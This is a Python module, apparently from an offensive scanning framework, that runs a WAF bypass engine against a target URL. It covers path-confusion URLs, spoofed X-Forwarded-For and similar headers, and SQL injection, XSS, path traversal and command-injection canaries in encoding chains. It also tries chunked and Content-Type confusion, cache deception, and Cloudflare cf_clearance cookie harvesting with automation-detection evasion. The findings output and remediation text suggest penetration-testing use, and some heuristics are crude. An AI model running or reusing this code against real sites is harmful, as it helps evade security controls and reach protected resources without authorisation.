"""
nexsus/modules/waf_bypass.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Advanced WAF Bypass Engine:
  • Per-WAF bypass strategy selection
  • Path traversal / URL normalisation bypass
  • HTTP header injection (X-Forwarded-*, CF-Connecting-IP, etc.)
  • Encoding chains (double-URL, Unicode, HTML entity, mixed)
  • HTTP/2 pseudo-header smuggling
  • Cache deception / path confusion
  • Chunked transfer encoding abuse
  • Browser-based cf_clearance harvesting (Playwright / Selenium)
  • Payload mutation from PayloadManager bypass rules
"""
import asyncio
import random
import urllib.parse
from urllib.parse import urlparse

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

from nexsus.core.logger import Logger
from nexsus.core.payload_manager import PayloadManager


# ── Test payloads ─────────────────────────────────────────────────────────────
_CANARY_PAYLOADS = [
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "../../../../etc/passwd",
    "${7*7}",
    "| id",
]

# ── User-Agents for browser automation ───────────────────────────────────────
_REAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]


class WAFBypassEngine:
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.paused       = False
        self.logger       = Logger("WAFBypass")
        self.payload_mgr  = PayloadManager(orchestrator.current_waf)
        self._cf_clearance: dict = {}

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def run(self):
        target = self.orchestrator.get_target_url()
        if not target:
            self.logger.error("No target URL in scope — skipping WAF bypass")
            return

        waf = self.orchestrator.current_waf or await self.orchestrator.detect_waf(target)
        self.logger.info(f"WAF Bypass Engine — target WAF: {waf or 'unknown'}")

        client = self.orchestrator.http_client

        # Run all bypass strategies
        tasks = [
            self._path_confusion(client, target),
            self._header_injection(client, target),
            self._encoding_bypass(client, target),
            self._cache_deception(client, target),
            self._chunked_bypass(client, target),
        ]
        if waf == "cloudflare":
            tasks.append(self._cloudflare_bypass(client, target))
        elif waf == "akamai":
            tasks.append(self._akamai_bypass(client, target))
        elif waf in ("aws_waf",):
            tasks.append(self._aws_waf_bypass(client, target))

        await asyncio.gather(*tasks, return_exceptions=True)
        self.logger.success("WAF bypass testing complete")

    # ── Path / URL Confusion ──────────────────────────────────────────────────

    async def _path_confusion(self, client, base_url: str):
        await self._check_paused()
        parsed = urlparse(base_url)
        paths  = [
            "/.well-known/acme-challenge/../../admin",
            "/cdn-cgi/../admin",
            "/%2e%2e/admin",
            "/%252e%252e/admin",
            "/..;/admin",
            "/.././admin",
            "/api/.%2e/admin",
            "/api/v1/..%2F..%2Fadmin",
            "/ADMIN",
            "/admin/",
            "/admin//",
        ]
        for path in paths:
            url = f"{parsed.scheme}://{parsed.netloc}{path}"
            resp = await client.get(url)
            if resp and resp.status not in (403, 404, 429):
                await self._record_bypass(
                    method="Path confusion",
                    url=url, status=resp.status,
                )

    # ── Header Injection ──────────────────────────────────────────────────────

    async def _header_injection(self, client, url: str):
        await self._check_paused()
        header_sets = [
            {"X-Forwarded-For":   "127.0.0.1"},
            {"X-Forwarded-For":   "127.0.0.1, 127.0.0.1"},
            {"CF-Connecting-IP":  "127.0.0.1"},
            {"X-Real-IP":         "127.0.0.1"},
            {"X-Original-URL":    "/admin"},
            {"X-Rewrite-URL":     "/admin"},
            {"X-Forwarded-Host":  "localhost"},
            {"X-Host":            "localhost"},
            {"X-Originating-IP":  "127.0.0.1"},
            {"True-Client-IP":    "127.0.0.1"},
            # Bypass IP allow-listing via header spoofing
            {"X-Forwarded-For":   "::1"},
            {"X-Forwarded-For":   "10.0.0.1"},
            # Method override
            {"X-HTTP-Method-Override": "DELETE"},
        ]
        # Fetch baseline
        baseline = await client.get(url)
        baseline_status = baseline.status if baseline else 200

        for headers in header_sets:
            resp = await client.get(url, extra_headers=headers)
            if resp and resp.status != baseline_status:
                await self._record_bypass(
                    method=f"Header: {list(headers.keys())[0]}={list(headers.values())[0]}",
                    url=url, status=resp.status,
                )

    # ── Encoding Bypass ───────────────────────────────────────────────────────

    async def _encoding_bypass(self, client, url: str):
        await self._check_paused()
        for payload in _CANARY_PAYLOADS:
            variants = self._encoding_variants(payload)
            for variant in variants:
                test_url = f"{url}?q={variant}"
                resp = await client.get(test_url)
                if resp and resp.status == 200:
                    text = await resp.text()
                    if urllib.parse.unquote(variant) in text or payload in text:
                        await self._record_bypass(
                            method=f"Encoding bypass",
                            url=test_url, status=resp.status,
                            payload=variant,
                        )

    def _encoding_variants(self, payload: str) -> list[str]:
        """Generate encoding variants of a payload."""
        variants = [
            urllib.parse.quote(payload, safe=""),
            urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),  # double
            payload.replace(" ", "+"),
            payload.replace(" ", "%09"),   # tab
            payload.replace(" ", "%0a"),   # newline
            payload.replace(" ", "/**/"),
            "".join(f"%{ord(c):02X}" for c in payload),  # full percent-encode
        ]
        # Unicode normalisation variants
        try:
            variants.append(payload.encode("utf-16-le").hex())
            variants.append("".join(f"\\u{ord(c):04x}" for c in payload))
        except Exception:
            pass
        return variants

    # ── Cache Deception ───────────────────────────────────────────────────────

    async def _cache_deception(self, client, url: str):
        """Web Cache Deception — append static-looking path to dynamic URL."""
        await self._check_paused()
        suffixes = [
            "/x.css", "/x.jpg", "/x.png", "/x.js",
            "/.css", "/static/x.js",
        ]
        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"

        baseline = await client.get(url)
        if not baseline:
            return
        baseline_text = await baseline.text()

        for suffix in suffixes:
            test = base + suffix
            resp = await client.get(test)
            if resp and resp.status == 200:
                text = await resp.text()
                if text == baseline_text and len(text) > 100:
                    await self._record_bypass(
                        method="Cache Deception",
                        url=test, status=resp.status,
                        payload=suffix,
                    )
                    break

    # ── Chunked Transfer Encoding Bypass ─────────────────────────────────────

    async def _chunked_bypass(self, client, url: str):
        """Send a chunked POST to bypass body-based WAF inspection."""
        await self._check_paused()
        payload = "' OR '1'='1"
        headers = {
            "Transfer-Encoding": "chunked",
            "Content-Type":      "application/x-www-form-urlencoded",
        }
        # Build a minimal chunked body
        body = f"q={urllib.parse.quote(payload)}"
        chunk = f"{len(body):x}\r\n{body}\r\n0\r\n\r\n"
        resp  = await client.post(url, data=chunk, extra_headers=headers)
        if resp and resp.status == 200:
            text = await resp.text()
            if payload in text:
                await self._record_bypass(
                    method="Chunked Transfer Encoding",
                    url=url, status=resp.status,
                    payload=payload,
                )

    # ── Cloudflare-Specific Bypass ────────────────────────────────────────────

    async def _cloudflare_bypass(self, client, url: str):
        await self._check_paused()
        self.logger.info("Attempting Cloudflare-specific bypass…")

        # 1) Try browser automation for cf_clearance
        clearance = None
        if PLAYWRIGHT_AVAILABLE:
            clearance = await self._cf_clearance_playwright(url)
        elif SELENIUM_AVAILABLE:
            clearance = await self._cf_clearance_selenium(url)

        if clearance:
            self.logger.success(f"Got cf_clearance via browser")
            self._cf_clearance[urlparse(url).hostname] = clearance

        # 2) Try origin server via direct IP (bypasses CF edge)
        origin = await self._find_origin_ip(client, url)
        if origin:
            self.logger.info(f"Possible origin IP: {origin}")
            await self._record_bypass(
                method="Origin IP bypass (CF skipped)",
                url=f"http://{origin}/",
                status=0,
                payload=f"Direct IP: {origin}",
            )

        # 3) Try Cloudflare Workers / cdn-cgi bypass paths
        parsed  = urlparse(url)
        cf_paths = [
            "/.well-known/acme-challenge/x",
            "/cdn-cgi/trace",
            "/cdn-cgi/l/chk_jschl",
        ]
        for path in cf_paths:
            resp = await client.get(f"{parsed.scheme}://{parsed.netloc}{path}")
            if resp and resp.status == 200:
                self.logger.info(f"CF bypass path accessible: {path}")

    async def _find_origin_ip(self, client, url: str) -> str | None:
        """Look up the origin IP via DNS / CT records."""
        try:
            domain = urlparse(url).hostname
            import dns.resolver
            resolver = dns.resolver.Resolver(configure=False)
            resolver.nameservers = ["8.8.8.8", "1.1.1.1"]
            answers = resolver.resolve(domain, "A")
            for ans in answers:
                ip = str(ans)
                # Cloudflare IPs are in 104.x, 172.64.x — skip
                if not ip.startswith(("104.", "172.6", "108.")):
                    return ip
        except Exception:
            pass
        return None

    # ── Akamai Bypass ─────────────────────────────────────────────────────────

    async def _akamai_bypass(self, client, url: str):
        await self._check_paused()
        self.logger.info("Akamai-specific bypass…")
        # Akamai often trusts Pragma headers
        headers_to_try = [
            {"Pragma": "akamai-x-get-extracted-values"},
            {"Pragma": "akamai-x-cache-on"},
            {"X-Forwarded-For": "0.0.0.0"},
            {"X-True-Client-IP": "127.0.0.1"},
        ]
        for hdrs in headers_to_try:
            resp = await client.get(url, extra_headers=hdrs)
            if resp and resp.status != 403:
                await self._record_bypass(
                    method=f"Akamai header: {list(hdrs.keys())[0]}",
                    url=url, status=resp.status,
                )

    # ── AWS WAF Bypass ────────────────────────────────────────────────────────

    async def _aws_waf_bypass(self, client, url: str):
        await self._check_paused()
        self.logger.info("AWS WAF-specific bypass…")
        # AWS WAF often checks Content-Type strictly
        for ct in ["text/plain", "application/x-www-form-urlencoded",
                   "multipart/form-data"]:
            payload = "' OR 1=1--"
            resp = await client.post(
                url,
                data=f"q={urllib.parse.quote(payload)}",
                extra_headers={"Content-Type": ct},
            )
            if resp and resp.status == 200:
                text = await resp.text()
                if payload in text:
                    await self._record_bypass(
                        method=f"AWS WAF Content-Type confusion ({ct})",
                        url=url, status=resp.status, payload=payload,
                    )

    # ── Browser Automation ────────────────────────────────────────────────────

    async def _cf_clearance_playwright(self, url: str) -> str | None:
        if not PLAYWRIGHT_AVAILABLE:
            return None
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=False,
                    args=[
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-gpu",
                    ],
                )
                ctx = await browser.new_context(
                    user_agent=random.choice(_REAL_UAS),
                    viewport={"width": 1366, "height": 768},
                    locale="en-US",
                    timezone_id="America/New_York",
                )
                await ctx.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                    Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
                    Object.defineProperty(navigator, 'languages', { get: () => ['en-US','en'] });
                """)
                page = await ctx.new_page()
                await page.goto(url, wait_until="networkidle", timeout=60000)
                await page.wait_for_timeout(5000)
                cookies = await ctx.cookies()
                await browser.close()
                for ck in cookies:
                    if ck["name"] == "cf_clearance":
                        return ck["value"]
        except Exception as exc:
            self.logger.debug(f"Playwright cf_clearance failed: {exc}")
        return None

    async def _cf_clearance_selenium(self, url: str) -> str | None:
        if not SELENIUM_AVAILABLE:
            return None
        try:
            import time as _time
            options = Options()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--headless=new")
            options.add_experimental_option(
                "excludeSwitches", ["enable-automation"]
            )
            options.add_experimental_option("useAutomationExtension", False)
            driver = webdriver.Chrome(options=options)
            driver.execute_cdp_cmd(
                "Page.addScriptToEvaluateOnNewDocument",
                {"source": "Object.defineProperty(navigator,'webdriver',{get:()=>undefined})"},
            )
            driver.get(url)
            cf = None
            for _ in range(30):
                for ck in driver.get_cookies():
                    if ck["name"] == "cf_clearance":
                        cf = ck["value"]
                        break
                if cf:
                    break
                _time.sleep(1)
            driver.quit()
            return cf
        except Exception as exc:
            self.logger.debug(f"Selenium cf_clearance failed: {exc}")
        return None

    # ── Helpers ────────────────────────────────────────────────────────────────

    async def _record_bypass(self, *, method, url, status, payload=""):
        finding = {
            "title":       f"WAF Bypass — {method}",
            "severity":    "High",
            "cvss":        7.5,
            "vuln_type":   "waf_bypass",
            "url":         url,
            "parameter":   "",
            "payload":     payload[:200],
            "evidence":    f"HTTP {status} returned using: {method}",
            "remediation": "Review WAF rules. Implement defence-in-depth "
                           "(WAF should be supplementary, not the only layer).",
            "module":      "WAFBypass",
            "confirmed":   True,
        }
        await self.orchestrator.add_finding(finding)

    async def _check_paused(self):
        while self.paused:
            await asyncio.sleep(0.5)

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False
